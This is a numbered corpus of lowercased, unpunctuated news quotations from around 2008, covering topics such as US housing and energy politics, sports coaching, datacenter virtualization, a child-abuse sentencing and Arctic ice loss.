8600153 it is clear from senate question time today that the government has not thought through the impacts of their planned welfare quarantining trials for truancy
8600154 in the senate today the government admitted that the trial was not limited to the suburb of cannington as originally stated instead the trial extends across the cannington centrelink district which includes the suburbs of south guilford burswood victoria park south perth queens park belmont bentley rossmoyne welshpool and canning vale
8600155 i would hope that the federal government is aware of the past failed trials of such measures in western australia such as the halls creek trial
8600156 the government were also unable to answer my questions about the support services that are in place for the families that have had their payments suspended particularly for those that have more than one child
8600157 i am concerned about the capacity of community services and charities to cope with an increase in demand for help from families who have had their payments suspended these organisations already help well over 400 000 people who are struggling to cope with the rising cost of living in wa
8600158 it is worrying that the government is rolling out a discriminatory new system across the whole country without proper data and are failing to learn from existing programs which havent worked
8600159 the things i thought were so important because of the effort i put into them have turned out to be of small value and the things i never thought about the things i was never able to either to measure or to expect were the things that mattered
8600160 we wanted to play in the champions league we have been in the semi final and final the last two years
8600161 it was a tough match but we believed in ourselves and it was a good performance
8600162 they were tough they were really fighting even in extra time
8600163 this is the best weve probably looked in about 3 years
8600164 we still have some holes on both lines and at linebacker but the team is coming together really well its the same way it is every year everyone is looking up at interboro until someone can consistently beat them
8600165 we wont be big up front but were running a new spread offense were probably going to run four wide in the gun
8600166 were getting more done in less time and well be more competitive on both sides of the ball well be a team that gets better each week
8600167 were young especially at quarterback but we also have an opportunity with three or four kids back that will offset that
8600168 bernard pierce showed a lot of growth and leadership over the summer and has developed even more as a football player we expect even more from bernard this year
8600169 if we play the way were capable of playing were capable of beating anyone on our schedule
8600170 the keys to us are always the same we have to play disciplined and execute what we do
8600171 the kids are working their butts off and we have kids playing football for the very first time i feel good about this team the kids are young why not win now four of our five losses came against playoff teams
8600172 when youve done something for 30 years you are certainly going to miss it

8600176 we wanted to make instruction available to students 24 7 and to provide student access to advice and productivity tools anytime and anywhere that made sense to them
8600177 with this consolidation we have addressed the need to have all of our servers centralized where they can be stored backed up and protected all in one location the dell solution provided everything from set up to the removal of our old pcs and boxes
8600178 we started using virtualization to address power and space issues in our main datacenter we quickly adopted vmware esx as our standard platform for new projects and consolidated existing servers
8600179 it allowed us to continue business as usual and we experienced no delay in completing projects on time today we are way below our power threshold and gained about 50 of our floor space even after we doubled the amount of windows servers
8600180 before going virtual our datacenter power supply was maxed out we couldnt plug in a toaster now with less hardware we have capacity to handle whatever comes our way
8600181 this allowed us to condense many servers is a small amount of space with vmware and ibm bladecenters we were able to consolidate over a 150 servers into one rack
8600182 today we use hp dl580 g5 to handle larger server workloads

8600186 we have been accepted on to a homebuying scheme whereby we can afford a better house than we would normally be able to would it be more sensible to do this than buy outright on our own

8600230 we always have more calls and e mails from kids and parents interested in swimming after an olympics
8600231 but theres been a lot more than usual in the past couple of weeks probably because of phelps its the same with the other coaches ive talked to
8600232 its great to see more kids and families getting into the sport how many of them will stay with it is the big question
8600233 the question we always ask beginning swimmers and families is are they ready to make the time commitment
8600234 it doesnt matter if youre with a united states swimming affiliated club like us the dolphins or at one of the area y teams
8600235 you have to be ready to put in the time
8600236 august is usually the only down period we have during the year
8600237 our big meets are done for the season we begin to gear back up in september so its almost a year round activity
8600238 the goal of the raiders or other swim clubs is specifically to develop swimmers to the highest level of national and international competition
8600239 so the training is going to be very intense and the competition at meets very deep
8600240 ive worked for some ys and the emphasis is on overall family fun and fitness there are plenty of very competitive y programs right around here like beavercreek south dayton or countryside in lebanon you get to the nationals and there are y teams which are tougher than a lot of club teams
8600241 we have taken a strict zero tolerance policy on this issue
8600242 we have tried just issuing warnings and asking them to move on but that didnt work
8600243 they have shown no respect for adults or police i do not intend on slacking off they are going to shape up or move on
8600244 i am hoping that with school starting that it puts a damper on it
8600245 i have witnessed some of this and i think we should totally back him preston up on this
8600246 we understand the complex history and realities of south ossetia and abkhazia
8600247 reflecting chinas consistent stance on such issues we hope all the parties can appropriately resolve the issue through dialogue and consultation
8600248 it cant influence georgia and it cant influence russian policy on georgia thats beyond our scope

8600264 a growing number of record companies are trying to steer clear of apple inc s behemoth music store because they say selling single songs on itunes in some cases is crimping overall music sales
8600265 i think maybe some of the basic coaching things like when i talk to johns hopkins coach dave pietramala about a situation or a player or the concept of preparing for this or that or how to present it or the psychological part of it i think theres some carryover there but lacrosse is a lot more like basketball or soccer its different than football where at the end of each play you huddle you pick a new play the games are a lot different but the coaching principles carry over
8600266 one of the things id say i learned the most was the appreciation of the skills and talents of other people the students and how different they were and how talented they were and how they could do things and not everybody did them the same way i think that applies to football where you have receivers that have different styles theyre good but theyre not all the same and you have to figure out ways to utilize those things what one person does well another person might not but they may still be able to be productive at that position you can be good with one style of defense or another style of defense as long as its coordinated and fits together
8600267 whoevers picking the players and coaching the players should pick them and coach them the way they want the team to perform im not saying its always perfect but if you want a really fast team you should go out and get really fast players if you want a really big team you should go out and get really big players if you want a team that can really throw the ball and youre a good passing coach then you should go out and get good passing players and you should coach them well and you should be able to throw the ball however you build you team you should be able to see that reflected in way the team performs unless you made a lot of mistakes or maybe theres too many cooks in the kitchen so to speak either coaching the team or selecting the team
8600268 in some respects you have to treat everybody the same
8600269 in a lot of cases our best players are our best leaders and our hardest workers they set a better example to be as good as they can possibly be thats an awesome situation thats really what you want you want your best players to really set the pace thats a great environment for everyone else to emulate and try to keep up with
8600270 the assistants are the backbone of our success really theyre the ones who do most of the coaching on a team basis i do a percentage of it but they actually do a far greater percentage of it i think there is a balance you want everybody to work together at the same time you want people to be able to work independently and come up with things on their own and handle problems on their own but its all in the context of a team framework
8600271 it was an opportunity to take what i think has been a maligned world sara lee dances with disneys

8600593 storesonline is thrilled to support and enable such a wonderful cause the oas program empowers children with asthma with the right tools and training to not only survive their asthma but really thrive
8600594 starting out many of these kids dont want anyone to know they have asthma because it labels them or makes them feel embarrassed however after attending oas they see they are not alone and they gain the skills and confidence to fully participate in activities they previously had avoided
8600595 this program helps empower the children to take ownership of their asthma and learn key skills and techniques to help them in everyday situations they learn about their medications and the importance of taking them when and how they should
8600596 my daughter never complains about taking her puffer inhaler in public anymore she knows more about her symptoms and knows what she needs to do in any possible situation before the oas program my daughter used to call home every day from school complaining about her asthma after the oas program she stopped calling home was no longer scared to take her medications and she learned strategies to help her relax when she was having a difficult time breathing
8600597 it is our goal to expand this program in the coming years so more schools and children outside the wasatch front have the opportunity to benefit from oas we look forward to our continued relationship with storesonline and encourage other businesses to get involved in this life changing program
8600598 as a business storesonline is committed to making a difference by providing entrepreneurs and small business owners the tools and training they need to survive and thrive on the internet getting behind and supporting an entrepreneurially driven program like oas is a natural extension of our company values as oas is also focused on providing the right tools and training so children with asthma can also survive and thrive in school and in life

8600622 the bottom line however is that the strong negative trend in summertime ice extent characterizing the past decade continues
8600623 we could have no ice at the north pole at the end of this summer and the reason here is that the thin ice and this ice we call first year ice the ice that tends to melt out in the summer
8600624 its possible that ships could sail from alaska right to the north pole
8600625 clearly if you look over what we have seen in the past three years and where we were headed we are in this long term decline and we may have no ice at all in the in summer by 2030 or so

8600683 for many years weve been hearing from our communities that there is concern out there who are attending baltimore county schools who are not legitimate students theyre not members of that community
8600684 this is one more way for us to be able to know who is in our schools and to verify who is in the classroom attending those classes
8600685 i think it gets a little old you feel like you have to explain yourself where you live and that gets on my nerves
8600686 i know how difficult it is and how overcrowded some schools are and i really feel that certain people deserve a chance

8600689 ever since i met del 55 years ago i could never imagine a day would come when she wouldnt be by my side
8600690 i also never imagined there would be a day that we would actually be able to get married
8600691 i am devastated but i take some solace in knowing we were able to enjoy the ultimate rite of love and commitment before she passed
8600692 we would not have marriage equality in california if it werent for del and phyllis they fought and triumphed in many battles
8600693 through it all their love and commitment to each other was an inspiration to all who knew them
8600694 the greatest way we can honor the life work of del martin is to continue to fight and never give up until we have achieved equality for all
8600695 this is common global practice and would enable the company to enhance its financial flexibility as the company builds its exploration and production portfolio
8600696 as far as the design and production are concerned it is not a major issue but this relates to the aircrafts capability and goes right to the heart of why the government should accept kais proposal for an f a 50
8600697 it makes little sense to have some aircraft with mesa and others with aesa even if the earlier aircraft can be upgraded in the future
8600698 some in south korea feel that lockheed is asking for too much money for its involvement but kai is keen to work with them and their involvement may be crucial to the programme
8600699 the americans were instrumental in helping to develop the t 50 and making it a success discussions are ongoing but the f a 50 will cost less than its alternatives as it is based on the t 50 platform and that is likely to factor into the governments considerations

8600707 it makes no sense because officially gill is not an authority anymore the ihfs executive body was suspended following a corruption scandal so it could be an illegal move on his part
8600708 i dont want to speak much as the matter is subjudice gill had asked for a relief in the matter but court had refused that and it is hearing his plea
8600709 kalmadi will be calling various associations about future plans and issues related to the game and that would have made gill anxious

8600712 we think overall automobile industrys growth will again remain in single digit in the second quarter of this fiscal as it was in the first quarter of this fiscal
8600713 indian auto industry declined from 26 per cent in the first quarter of 2006 07 to 17 per cent in the same period in 2007 08 and now it has gone down to 7 8 per cent on account of increasing lending rates and fuel cost
8600714 there is no doubt that current conditions have impacted the industrys growth
8600715 people are postponing their purchases as the cost of buying has shot up considerably during last couple of months due to steps taken by the government to rein in the inflation
8600716 only those people who are in urgent need of a car are buying it as a result the growth is affected
8600717 we expect to commence the export of this version within eight months to one year primarily to south africa italy spain and sri lanka
8600718 out of 9 85 lakh indica we exported 70 000 80 000 cars to other countries
8600719 one of the major reasons for people not opting e bikes is lack of infrastructure support when battery charge runs out on the way and where to charge the same to overcome this we have decided to set up 10 000 charging stations in the country by the end of 2009 10
8600720 the stations will be installed in conjunction with garage owners termed as hero electric pgos preferred garage owners and the cost will be shared equally
8600721 overall the treasury announcement is a sensible response to a constructive period of consultation but it is disappointing that progress has been so slow

8600724 the presidents action underscores the importance of congresss attention to this matter in 2006 we secured a law that opened substantial areas to development while also protecting the eastern gulf of mexico until 2022 even with this announcement that protection remains
8600725 in light of the current energy crisis congress must take steps to develop domestic resources while encouraging conservation i look forward to congress acting to make it possible for states to engage in offshore development if they so choose and respect the wishes of states like florida that wish to keep drilling at a distance that doesnt impact our environment our economy or the missions of the united states military

8600729 florida is proud to be the home to the 4th fleet i commend the navys decision to re establish the 4th fleet in jacksonville which demonstrates mayports strategic importance to the region and national security
8600730 the fleets location in jacksonville will provide tremendous support to the u
8600731 this is a real crisis for floridians and the american family inaction from congress is not acceptable
8600732 more production is part of the equation while i have guarded floridas coast there are safe places we can explore including the 8 million acres we opened in the eastern gulf we need to throw everything at the problem more research into new and alternative sources of energy and development of better plug in vehicles in addition conservation is a crucial element
8600733 high gas prices are the single most important issue to americans right now and we need to focus on solutions for short term relief and long term domestic energy development
8600734 in the long term we need to take full advantage of our domestic resources which includes developing our oil supplies and also increasing our use of nuclear power nuclear power is safe emissions free power that can be used to make our nation energy independent
8600735 this is what floridas communities need right now the money and reassurance that assistance is on the way fay is leaving a lot of debris in her wake and expediting removal helps keep the public safe
8600736 our bill will give agencies the tools to stop fraud at the front end rather than having the department of justice get involved at the back end after the fraud has occurred
8600737 instead of continuing the current practice of pay and chase the federal government needs to shift to a policy of detect and prevent
8600738 this will lead to less fraud and greatly reduce identity theft among our seniors
8600739 it will also allow seniors and the government to easily take a medicare recipients number out of circulation when fraud is detected
8600740 having an office at the usf tampa campus will provide better accessibility for people seeking assistance with federal issues
8600741 i am excited to join the usf community and look forward to serving gulf coast residents at this location

8600743 i set out to write this book for my children and grandchildren and i studiously stayed away from that
8600744 i would hope this is a book can inspire young people particularly young people who are facing some hardship whether they be immigrants or in foster care
8600745 mr president during the time i am privileged to serve i would hope that i could have a voice on issues relating to cuba
8600746 mel will be able to have something to say on cuba
8600747 with this issue were reaching out to people who thought we lost our way on fiscal issues
8600748 we hope as a result of that hearing theres going to be a much greater understanding of how big a problem it is
8600749 theres just so many needs in this arena and so little money that for it to be walking out the door with criminals is really a criminal deed itself
8600750 the more realistic approach is to highlight this issue to continue to work on it to continue to build support and then make a really really strong effort the next congress as part of what i believe will be a larger healthcare legislative effort
8600751 the cooperation between the relevant oil companies from china and iraq is mutually beneficial
8600752 it will be conducive to the economic development of iraq will meet chinas demands in the oil field as well and is also conducted according to market rules and will not harm any interests of any third parties
8600753 this legislation will bring relief to many florida homeowners who face losing their homes the measure also puts long term fixes in place to prevent a housing crisis like this from occurring in the future
8600754 the reform includes a provision to modernize the fha allowing the program to insure larger loans and to reach more families that need help the bill will also provide a stronger oversight system for gses so they are better able to serve homebuyers and fulfill their public mission in addition tax credits for first time homebuyers will encourage those looking to make an initial purchase further helping to stimulate the housing market
8600755 although congress has taken a number of steps to help alleviate the current housing crisis we need to proactively put practices in place that will help prevent another crisis down the road
8600756 setting minimum national standards for all residential mortgage loan originators will go a long way toward achieving that goal i am pleased this measure is included as part of the broader housing package
8600757 while we still need to work to make appraisal standards uniform across the nation this strengthens standards for fha appraisals and ensures the integrity of the new fha program that offers foreclosure assistance
8600758 my commitment to doctors has always been to make certain they do not suffer pay cuts due to a faulty medicare reimbursement formula
8600759 the measure we moved forward today does not provide the kind of solution doctors deserve but this is the only option to stop doctors in florida from having their pay cut by 10
8600760 no matter the conflict members of our armed forces answer the call rise to the challenge and make tremendous sacrifices on behalf of a grateful nation
8600761 as an immigrant to america i have been the beneficiary of those who sacrificed so that i might have the opportunity to live in freedom having lived in oppression i can assure you that freedom is a valued gift and i thank you for your service in the cause of freedom
8600762 access to quality health care is a right everyone who has worn our nations uniform deserves
8600763 i am happy to say that this long overdue dream of so many central florida veterans is finally moving forward we have secured the property the plans are in the works and its only a matter of time before a new hospital comes online and begins serving area veterans
8600764 with more than 1 million recreational boaters this unnecessary permit requirement would have hit florida hard
8600765 requiring family boaters to secure a clean water act permit so that they can wash their boat fish or go waterskiing is unreasonable costly and essentially unenforceable mobilizing the epa to take on this needless task would have been an additional cost and burden to families and a tremendous waste of taxpayer resources
8600766 most charter boats dont have the ballast issue that is the target of the court ruling there ought to be an opportunity to study where additional regulation is necessary and where it isnt
8600767 this bill provides a reprieve for small business owners who are already dealing with rising fuel prices and a troubled economy
8600768 the needs of the veterans in this community have grown beyond the navy and va facilities capabilities the clinics are old undersized and substandard the renovations made possible by the joint inventive fund will help but a new facility still needs to be built
8600769 i will continue doing all that i can to ensure the health care needs of bay countys veterans retired and active duty personnel and their families are being met and that a new facility remains a priority for the navy and va
8600770 high gas prices are the single most important issue to americans right now and we need to focus on solutions for short term relief and long term domestic energy development
8600771 companies like csx are an important part of the long term strategy which will have to incorporate reliable available and inexpensive sources of energy
8600772 florida has been hit hard by the housing crisis ranking second in the nation in record foreclosures last year this bill is the product of congress coming together to address this crisis and bring relief to floridians who face losing their homes
8600773 while addressing the current crisis this also strengthens the housing market for the long term modernization of the fha will allow the program to serve more families after the recent problems with freddie mac and fannie mae it is clear that we need a stronger oversight system for gses to better fulfill their public mission and this bill puts that system in place
8600774 the current crisis has shown us that while some homeowners unfortunately made bad financial decisions others were clearly taken advantage of by bad actors in the housing industry national licensing standards will help decrease the number of unscrupulous loan originators and predatory mortgages
8600775 the safe act will help to eliminate fraudulent loan originators from the housing industry and give more reassurance to homebuyers at a time when they are making an important financial commitment in purchasing a home
8600776 this is the first step in working to make appraisal standards uniform across the nation
8600777 this provision strengthens standards for fha appraisals and ensures the integrity of the new fha program that offers foreclosure assistance
8600778 i compliment the group for coming together in a bipartisan way to try to address the current energy crisis
8600779 its nonsense that the u s government is inflating the price of ethanol especially at a time when american families are paying record high prices for fuel
8600780 not only is this tariff costing americans more at the pump its preventing us from diversifying our fuel supply
8600781 if were serious about reducing gas prices in this country removing this tariff and other arbitrary mandates created by congress would help reduce record high fuel costs
8600782 the report released today further demonstrates why agencies need tools to stop fraud at the front end rather than having the department of justice get involved at the back end after the fraud has occurred
8600783 medicare fraud is not only hurting seniors but it is also wasting taxpayer dollars instead of continuing the current practice of pay and chase the federal government needs to shift to a policy of detect and prevent
8600784 americans need to have peace of mind that they have life insurance coverage when traveling abroad people should not be denied coverage or have to pay outrageous amounts for a policy based on where they travel
8600785 this legislation ensures that insurance companies cannot use future travel plans as a basis to increase rates or cancel coverage it is my hope that the banking committee will act quickly to pass the lift act so that it can move to the full senate for consideration
8600786 this law will bring immediate relief to the suffering homeowners facing foreclosure while addressing long term changes necessary to strengthen the housing industry
8600787 this is a prime example of how effective congress can be when legislators put politics aside and come together in a bi partisan manner to best serve the american people during a time of crisis
8600788 im disappointed by the way we played we had our opportunities but our day cricket has not been consistent especially with the bat we have not been consistent
8600789 if you are not capable of getting the runs it is quite difficult to win matches
8600790 we just need to make sure that our batting is consistent in one day cricket it is important that you be very consistent with the bat that is where i think we lost the series
8600791 although congress has taken a number of steps to help alleviate the current housing crisis we need to proactively put practices in place that will help prevent another crisis down the road
8600792 setting minimum national standards for all residential mortgage loan originators will go a long way toward achieving that goal i am pleased this measure is included as part of the broader housing package
8600793 this broad housing legislation that the senate passed today will help hundreds of thousands of americans keep their homes
8600794 and the safe mortgage licensing act will ensure that americas mortgage brokers and lenders are ethical professionals unfortunately weve heard countless stories of bad actors in this industry people who engage in fraudulent lending practices such as steering people into loans they clearly cannot afford simply put the only way to crack down on these abuses is to ensure that brokers and lenders meet basic standards and earn a license this legislation does exactly that
8600795 what i dont want is for the best to be the enemy of the good
8600796 if we can come up with a genuine bipartisan compromise in which i have to accept some things i dont like and the democrats have to accept some things they dont like when its actually moving us in the direction of energy independence im open to that
8600797 what i will not do is support a plan that suggests that drilling is the answer to our energy problems
8600798 no one really knows where barack obama is on the issues these days
8600799 what we do know is that hes spent months attacking john mccains common sense plans to increase domestic production so anything he says should be taken with a grain of salt hell probably try to refine his stands a few more times before november if it is in his political interest
8600800 the one thing that ive said consistently when it comes to the florida coastline is that as dependent as this state is on tourism as important as that coastline is weve got to proceed with extreme caution when it comes to anything that has an impact on that extraordinary treasure
8600801 to help formulate this vision im going to re establish the national aeronautics and space council so that we can develop a plan to explore the solar system a plan that involves both human and robotic missions and enlists both international partners and the private sector and as america leads the world to long term exploration of the moon and mars and beyond lets also tap nasas ingenuity to build the airplanes of tomorrow and to study our own planet so we can combat global climate change under my watch nasa will inspire the world once again
8600802 in no way do i think that john mccains campaign is being racist i think theyre being cynical
8600803 i think they want to distract people from talking about real issues

8600822 the situation in the region should be resolved in dialogue
8600823 trying to draw up a strong text sigifying our unwillingness to accept
8600824 sanctions are being considered and many other means as well
8600825 we are in a situation which marks a clear end to the relative and growing calm in and around europe since the collapse of the soviet union
8600826 i think we can safely say that this is the first long distance car journey in europe that has relied on restaurants and burger bars as an informal network of filling stations
8600827 its true we spent a lot of time fat finding knocking on the doors of restaurants begging for their waste but it worked and the beauty of course is that when such supplies are collected straight from a restaurant and used as fuel they have a zero carbon footprint
8600828 we used what is known as an oily bits centrifuge system the worlds first mobile purification system for cars to filter the waste en route
8600829 i think we made quite a lot of converts along the way
8600830 theres a whole trail out there of restaurant owners who are now looking at their waste products with different eyes our hope is that others will start to realise the energy that is in waste too
8600831 to assess whether policing techniques shared and learned during these exchanges are fully compliant with canadian law and the charter
8600832 foreign police officers are formally provided policing status if they are to be exercising policing powers in canada
8600833 troopers were involved in both stops of the motorist in question
8600834 texas state troopers were engaged in direct policing contrary to rcmp policy
8600835 we all know that a police officer from outside the country doesnt have the powers of a peace officer here in b c
8600836 we had concerns about what are texas rangers doing stopping cars and engaging in active law enforcement in canada
8600837 unfortunately though the commission substantiated a lot of our complaint it didnt go that far as to say its bad policy for the rcmp to use foreign officers to enforce the law in canada
8600838 the delay was in excess of 18 months for a file in which the commissioner was in almost complete agreement
8600839 this was a tough quarter for our wholesale bank the mispricing that occurred is particularly disappointing and not consistent with our strong risk management culture
8600840 while we acknowledged that early 2008 would be challenging with continued market volatility and slower economic growth we did not anticipate these conditions to persist for as long as they have nor the impact to be as broad

8600855 you just lost it you resented the child your dislike of the child came to the surface
8600856 you forcibly banged this childs head against a hard surface as a result of that you caused a fracture to the skull which resulted in death probably instantly
8600857 then you covered it up there was something almost cynical about the way you tried to cover it up
8600858 you told all sorts of lies some of them absurd lies
8600859 youre both the victims of a cycle of depravation but theres nothing in your background which justifies the way you treated this child
8600860 it has to be recognised that when children are neglected in this way with such frightening results a custodial sentence must follow
8600861 they couldve taken action as soon as they saw things happening
8600862 they should have taken her away or given her to me
8600863 they were willing to do that they decided to give laura a second chance
8600864 we along with several other agencies were working with rubys family at the time of her murder by mitchell cooper and had been closely monitoring rubys health and welfare
8600865 a multi agency child protection investigation and child protection conference were held about ruby
8600866 at that conference which took place just six days before rubys murder the decision was taken to place her on the child protection register under the categories of physical abuse and neglect
8600867 rubys mother did not stick to the child protection plan that was agreed at the conference and her boyfriend mitchell cooper who was not living with laura spink went on to murder ruby when he was left alone with her
8600868 based on his background cooper had been assessed as low risk
8600869 during the course of his trial several witnesses have spoken of his ill treatment of ruby
8600870 we heard most of this evidence for the first time in court and the court also heard that no residents at the hostel where ruby and laura were living ever complained to either us or the police about his treatment of ruby

8600875 the eu roaming regulation was introduced so that europeans could exercise freedom of speech with their mobile phones without fear of excessive bills when travelling in the single market as a result over 400 million consumers across europe have benefited from significant savings of around 60 when making and receiving calls during travel holiday or business
8600876 the further reduction of the eurotariff on 30 august will reaffirm the trend for lower roaming prices the next challenge is now to bring about a single market for roaming text messages and data services i count on the french presidency and on the european parliament to help the commission solve this problem very soon
8600877 wenn die commerzbank die dresdner bank in zwei schritten zu je 50 prozent bernimmt spricht der stopp des aufspaltungsprozesses eher f r eine schnelle l sung mit der commerzbank
8600878 es deutet alles darauf hin dass es bei den sitzungen zu einer entscheidung kommen wird

8600909 its really time to finish this show so lets start again in a parallel universe
8600910 in der formel 1 sitzt man an der strecke und sieht ein paar autos vorbeifahren und das war es dann aber hier k nnen die fans zu den fahrern ins fahrerlager und k nnen sich autogramme holen es ist viel pers nlicher als andere serien die fans bekommen viel mehr f r ihr geld geboten sie kommen in den paddock sie kommen in die boxengasse die fans sehen viel mehr und auch die rahmenrennen sind toll das ganze wochenende macht spa
8600911 sie ist sehr kurz und hat eigentlich keine geraden man muss sich durch den ganzen kurs arbeiten es ist eine gro e herausforderung
8600912 die strecke ist so kurz und die rundenzeiten liegen so eng beieinander man muss wirklich die perfekte runde hinlegen um ein paar hundertstel schneller zu sein als jemand anderes das kann viele pl tze ausmachen es ist sicherlich eine andere herausforderung als auf anderen rennstrecken man kann das qualifying mit dem am norisring vergleichen wo die zeiten auch so eng beieinander liegen
8600913 man muss wirklich die perfekte runde hinlegen um ein paar hundertstel schneller zu sein als jemand anderes
8600914 nat rlich einfach ins auto zu steigen und an die strecke zu fahren und die vielen britischen fans es ist wirklich toll f r mich und die anderen britischen fahrer in brands hatch zu fahren wir kennen die strecke alle sehr gut weil wir dort alle schon in sehr jungen jahren rennen gefahren sind ich bin dort mit 16 schon in formelserien gefahren ich kenne den kurs sehr gut und es macht mir spa dort zu fahren
8600915 wir sind gute freunde er ist ein guter fahrer er war bisher sehr erfolgreich er war in seinem ersten jahr knapp davor die weltmeisterschaft zu gewinnen das war unglaublich er macht auch in diesem jahr einen sehr guten job das team ist sehr zufrieden damit wie alles l uft

8600946 in the spirit of unity with the goal of victory
8600947 everything ive learned in eight years as president and the work ive done since in america and across the globe has convinced me that barack obama is the man for this job
8600948 these times require more than a good soldier they require a wise leader
8600949 a leader who can deliver change the change that everybody knows we need
8600950 the candidate who once promised a contest of ideas now has nothing left but personal attacks
8600951 no matter where we stood at the beginning of this campaign democrats stand together today
8600952 we believe passionately in barack obamas message of changing the direction of our country
8600953 we wanted to make an exciting kick off to our campaign and thank the community in a fun way
8600954 theres going to be a lot of people and a lot of good food its a social event
8600955 they know everyone has a good time and its great for restaurants to get so many people in one place to try their food
8600956 its great to meet new people and have new people see us we like to offer different things and a lot of people dont know that
8600957 all are agencies are wonderful to help out and appreciate the community giving to the united way because its through that they are able to keep their doors open

8600965 until the army corps of engineers addresses the situation downtown is still vulnerable
8600966 theres great things happening people just dont realize it yet
8600967 some of those stores that were downtown were just barely making it and the flood gave them a reason to not come back
8600968 but they will be filled up in time with businesses that do fit the current mold
8600969 since taking office ive worked to bring accountability and transparency on how taxpayers dollars are spent
8600970 there were more needy children in the cleveland area that could have benefited from those head start dollars
8600971 we hope by these findings that those who are contemplating misusing government money will think twice
8600972 the majority of people in public office are in it for the right reason often things we find werent intentional or fraudulent they were just a mistake
8600973 you can never pay back so you should always pay forward
8600974 i dont have any doubt that the republicans are gunning for that seat in 2010 in large part because of the seat on the apportionment board
8600975 it doesnt necessarily mean that all of their complaints are unjustified
8600976 we are eliminating all of the excuses she is making why does she want to prevent people from getting access to absentee ballots
8600977 while we appreciate the gesture most of our printing orders have already been submitted
8600978 its appalling that house speaker husted has attempted a possible go around on secretary brunner calling on boards of elections to ignore her directive regarding an unclear underfunded legislative mandate
8600979 secretary brunner has acted in good faith to make the best of what we were handed by the general assembly
8600980 the choice is clear the republicans in a few days will nominate a good man who has served our country heroically and who suffered terribly in a vietnamese prison camp he loves his country every bit as much as we do as a senator he has shown his independence of right wing orthodoxy on some very important issues but on the two great questions of this election how to rebuild the american dream and how to restore americas leadership in the world he still embraces the extreme philosophy that has defined his party for more than 25 years and it is to be fair to all the americans who arent as hard core democrats as we its a philosophy the american people never actually had a chance to see in action fully until 2001 when the republicans finally gained control of both the white house and the congress then we saw what would happen to america if the policies they had talked about for decades actually were implemented and look what happened they took us from record surpluses to an exploding debt from over 22 million new jobs to just 5 million from increasing working families incomes to nearly 7 500 a year to a decline of more than 2 000 a year from almost 8 million americans lifted out of poverty to more than 5 5 million driven into poverty and millions more losing their health insurance now in spite of all this evidence their candidate is actually promising more of the same
8600981 the goal of the video games defense is to both shift blame and to explain to a judge and jury why this good kid is suddenly acting like a terrorist
8600982 mention the war kids not having respect the good old days and the fact that real music came on records before they nod off and poo themselves and youre sure to get a conviction or overturn
8600983 where do you people get your information we never even hinted at his

8601022 blocking my site is a move by a desperate government that is trying to silence me but its not going to stop me
8601023 it only reveals that the government does not know how to handle the internet
8601024 everyone is subject to the law even web sites and blogs

8601033 embora nesta cl nica n o fa amos reprodu o assistida por motivos ticos chegam s nossas consultas bastantes casais com dramas terr veis tanto pelos fracassos da t cnica como pelo facto de saberem mesmo depois do xito que possuem embri es congelados e que se n o quiserem ou n o puderem enfrentar uma nova gravidez dentro de cinco anos t m que decidir o destino a dar lhes

8601263 we continue to find ourselves in a very difficult housing market with new home starts off 31 compared to our third quarter last year while remodeling activity is thought to be down about 10 our sales at engineered products down about 12 held up well when you consider the depressed state of these end markets our ability to consistently outperform the market is due in part to the strength of new programs and new customers we also believe our larger window and door customers are making measurable gains selling more window and door products into the home remodeling market which in turn directly benefits us
8601264 the housing market continues to suffer from a large inventory of both new and existing homes available for sale a rise in foreclosures and an ongoing tight credit market the u s department of housing currently estimates an 11 months supply of homes available for sale we did see a meaningful improvement in seasonal demand at engineered products with sales up about 25 over our sequential second quarter we remained diligent on costs continued to drive productivity improvements and worked with customers on pricing initiatives in an effort to recover rising raw material costs the company disclosed last quarter we were combining two separate facilities at our window and door fenestration components business into a single more efficient operation we look to have this consolidation complete by year end
8601265 our third quarter shipped pounds at nichols aluminum were down 11 from year ago levels but up 3 compared to the second quarter due to the seasonal increase in the building products markets nichols spread selling price less material costs per pound in the quarter was down 0 03 from the year ago quarter primarily due to a lower mix of painted sheet sales compared to our sequential second quarter unit sales price and spread were up consistent with higher aluminum ingot prices operating income compared to the third quarter 2007 was negatively impacted by a combination of a drop in shipped pounds lower painted sheet sales and higher freight and energy costs compared to the sequential second quarter operating income per pound was up 17 in an effort to both further reduce our scrap costs and provide us with a wider range of available scrap we recently invested in a new high torque scrap shredder at the nichols casting facility
8601266 our cash and equivalents at quarter end was a robust 54 million we still have one remaining cash true up item with gerdau that involves a tax payment currently estimated to be some 20 million in our favor our total debt to capitalization remained minimal at 0 5 our year to date operating cash flow from continuing operations came in at a very healthy 33 9 million we continue to closely monitor our working capital and at quarter end our conversion cycle was 32 days with our healthy cash balance strong cash flow and 270 million revolving credit facility we have the financial wherewithal to fund attractive growth opportunities both organic and acquisition related on the acquisition front we are actively evaluating various building products companies both in the residential and commercial space while we are experiencing some trepidation on the part of some acquisition candidates to sell at what appears to be the low point in the cycle we are confident that our proven track record and financial position will enable us to successfully implement our growth strategy

8601301 we started using virtualization to address power and space issues in our main datacenter we quickly adopted vmware esx as our standard platform for new projects and consolidated existing servers
8601302 it allowed us to continue business as usual and we experienced no delay in completing projects on time today we are way below our power threshold and gained about 50 of our floor space even after we doubled the amount of windows servers
8601303 before going virtual our datacenter power supply was maxed out we couldnt plug in a toaster now with less hardware we have capacity to handle whatever comes our way
8601304 this allowed us to condense many servers is a small amount of space with vmware and ibm bladecenters we were able to consolidate over a 150 servers into one rack

8601390 we dont tell our members how to vote well tell them it starts from the ground up who we think would be the best candidate for the membership its our job to put the information in their hands i think theyll make the right decision

8601392 a tiny portion of america is casting half an eye towards us every now and then maybe we hope
8601393 all in favor of having the presumptive nominee be the actual nominee say more pork sausage please okay its unanimous sally could you bring everybody their own carafe of syrup and drop the check at microsoft at amp t and gms table over there in the corner thats a darling
8601394 it is a huge task but we have covered nearly 75 percent of it we are confident that very soon the remaining shops and establishments shall also fall in line with the requirements
8601395 the way to influence behavior like that is to first raise peoples level of consciousness
8601396 i would probably go in and say were all trying to conserve energy pasadena is a very green city so it would be best if you didnt pour your air conditioning into the outside world and i might say that im not inclined to shop in a place that hasnt caught on to the green spirit of pasadena
8601397 i agree with so many of you but particularly with

8601617 a really important aspect of it is our ability to really be able to quantify what the benefit is
8601618 the green meter capability coupled with what we can already compute in terms of miles that would otherwise be traveled or gas expenditures that are associated with people going to these meetings as well as productivity loss with those travel hours is significant
8601619 green meter detects through the ip internet protocol locations of all those attendees who would travel to the host and through a series of complex algorithms is able to measure and provide metrics of what the carbon emission output would be from the trip as well as the fuel costs and fuel amounts associated with that trip
8601620 we first launched green meter a little over a year ago and since then across ilincs customers were going to save almost 2 billion pounds of carbon emissions this year
